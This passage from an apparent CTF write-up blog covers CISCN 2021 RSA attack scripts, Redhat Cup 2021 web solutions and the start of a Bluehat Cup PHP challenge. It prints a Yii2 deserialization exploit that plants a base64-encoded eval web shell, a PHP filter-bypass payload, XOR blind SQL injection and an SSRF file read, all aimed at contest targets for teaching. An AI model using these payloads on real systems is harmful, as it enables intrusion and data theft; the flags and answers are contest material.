class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> num1<span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> num2<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">1</span>                                              <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i3 <span class="token keyword">in</span> num3<span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">0</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i4 <span class="token keyword">in</span> num4<span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">0</span>                            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    flag <span class="token operator">=</span> <span class="token number">1</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> num5<span class="token punctuation">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                        <span class="token keyword">continue</span>                                    <span class="token keyword">else</span><span class="token punctuation">:</span>                                        flag <span class="token operator">=</span> <span class="token number">0</span>                                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span>i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                flag <span class="token operator">=</span> <span class="token number">1</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">continue</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span><span class="token comment">#################################</span></code></pre><p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p><p>fill_number 会检查</p><pre class="language-none"><code class="language-none">map0000000000044000003000010</code></pre><p>最后 md5(1425353142350212150442315,32) = 8a04b4597ad08b83211d3adfa1f61431</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> iroot<span class="token keyword">from</span> libnum <span class="token keyword">import</span> xgcd<span class="token punctuation">,</span> invmod<span class="token comment">#低解密指数攻击</span>n1<span class="token operator">=</span><span class="token number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>e1<span class="token operator">=</span><span class="token number">3</span>c1<span class="token operator">=</span><span class="token number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment">#共模攻击</span><span class="token keyword">import</span> time<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><span class="token punctuation">,</span><span class="token number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><span class="token punctuation">]</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>c2 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>e1 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e2 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token operator">-</span>s1    c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s2 <span class="token operator">=</span> <span class="token operator">-</span>s2    c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token string">' [-]m is:'</span> <span class="token operator">+</span> <span class="token string">'&#123;:x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[!]Timer:'</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span><span class="token comment">#已知高位p攻击</span><span class="token triple-quoted-string string">"""已知高位p，利用网上的sage脚本，获取pn=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147p=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902pbits = 512kbits = pbits-p.nbits()p=p&lt;&lt;kbitsprint("upper %d bits (of %d bits) is given" % (pbits-kbits, pbits))PR.&lt;x> = PolynomialRing(Zmod(n))f = x + px0 = f.small_roots(X=2^kbits, beta=0.4)[0]print(p+x0)out:upper 312 bits (of 512 bits) is given11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423"""</span>c4 <span class="token operator">=</span> <span class="token number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span>e4 <span class="token operator">=</span> <span class="token number">65537</span>N4 <span class="token operator">=</span> <span class="token number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>p <span class="token operator">=</span> <span class="token number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span>q <span class="token operator">=</span> N4 <span class="token operator">//</span> pn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e4<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c4<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到的16进制转md5即为flag值：</p><img src="/article/ciscn2021/image-20210517144130169.png" class="" title="image-20210517144130169" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红帽杯2021</title>
      <link href="article/redhat2021/"/>
      <url>article/redhat2021/</url>
      
        <content type="html"><![CDATA[<p>Web体验还行，不是太难，压轴题很合理</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>题目没啥意思23333，还老是503</p><p>扫下目录，访问<code>robots.txt</code> ，得到<code>1ndexx.php</code>，访问页面500报错，应该是缺参数，既然这样那肯定要给源码(不然寄刀片伺候)</p><p>发现备份文件<code>.1ndexx.php.swp</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，先看看phpinfo</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">./?code=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>访问<code>hack.php</code></p><p>搜索字符串，结果发现flag写在了环境变量里，被phpinfo暴露出来了</p><img src="/article/redhat2021/image-20210509205559176.png" class="" title="web1flag" loading="lazy"><p>说实话，<code>1ndexx.php</code>和<code>index.php</code> 切换迷惑人，然后平台的问题，盲猜docker分发写环境变量，最后没删23333</p><hr><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>扫到<code>www.zip</code>，看下是<a href="http://github.com/yiisoft/yii2/">Yii Framework2.0.32</a></p><p>去官网下原版比对一下，发现就改了个参数</p><h4 id="Yii2反序列化漏洞"><a href="#Yii2反序列化漏洞" class="headerlink" title="Yii2反序列化漏洞"></a><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii2反序列化漏洞</a></h4><p>拿poc直接打，由于base64后可能会有<code>/</code>或者<code>+</code>等，所以先base64一下写函数解码即可</p><p>system似乎被ban了不行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file_put_contents('1.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYV0pPz4='))"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 这里需要改为isRunning</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// poc2</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 生成poc</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这里原poc打的参数是data，这里修改为message</p><img src="/article/redhat2021/image-20210509210754051.png" class="" title="message" loading="lazy"><p>打过去就行，虽然报错但是已经执行了</p><img src="/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png" class="" title="poc" loading="lazy"><p>在当前目录会生成<code>1.php</code>，蚁剑连一下</p><img src="/article/redhat2021/image-20210509211521847.png" class="" title="getshell" loading="lazy"><p>发现有disable_function，当时心凉一截，不会和蓝帽一样…</p><p>侥幸心理测了下蚁剑的突破插件，发现<code>Apache_mod_cgi</code>可以，执行根目录下<code>/readflag</code>即可</p><img src="/article/redhat2021/image-20210509211350611.png" class="" title="web2flag" loading="lazy"><hr><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>打开登陆界面，估计是注入</p><p>看看连接，发现异常请求，还好没上来对着<code>username</code>乱试</p><img src="/article/redhat2021/image-20210509212002489.png" class="" title="imagephp" loading="lazy"><p>经测试，可以使用异或 盲注</p><pre class="language-none"><code class="language-none">错误语句返回报错正确语句错误表达返回：WHAT ARE YOU DOING正确语句id为1返回图片正确语句id为0返回空</code></pre><img src="/article/redhat2021/image-20210509212509022.png" class="" title="1^1" loading="lazy"><img src="/article/redhat2021/image-20210509212527090.png" class="" title="1^0" loading="lazy"><img src="/article/redhat2021/image-20210509212645414.png" class="" title="error" loading="lazy"><p>异或盲注脚本跑，可见以前写的WP</p><p>拿到信息如下</p><pre class="language-none"><code class="language-none"># version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;5.5.60-0+deb8u1# databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf# tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;images,users# users.columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;username,password# users.data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;admin~a1d4f79c94f0cd3feeac4</code></pre><p>似乎密码还是容器随机的，拿到用户名密码登陆</p><img src="/article/redhat2021/image-20210509213045341.png" class="" title="ssrf" loading="lazy"><p>明显ssrf，用file协议读一下文件可行，直接读flag</p><p>payload：</p><pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre><img src="/article/redhat2021/image-20210509213219524.png" class="" title="web3flag" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯2021一道题——One_Pointer_PHP</title>
      <link href="article/bluehat2021/"/>
      <url>article/bluehat2021/</url>
      
        <content type="html"><![CDATA[<p>深入学习蓝帽杯web一道题</p><a id="more"></a><p>质量很高的一道题，详细写下做个总结，深入学习一下知识点</p><h2 id="WEB-One-Pointer-PHP"><a href="#WEB-One-Pointer-PHP" class="headerlink" title="WEB-One_Pointer_PHP"></a>WEB-One_Pointer_PHP</h2><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p>给了<code>www.zip</code>，部分源码，分析一下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token 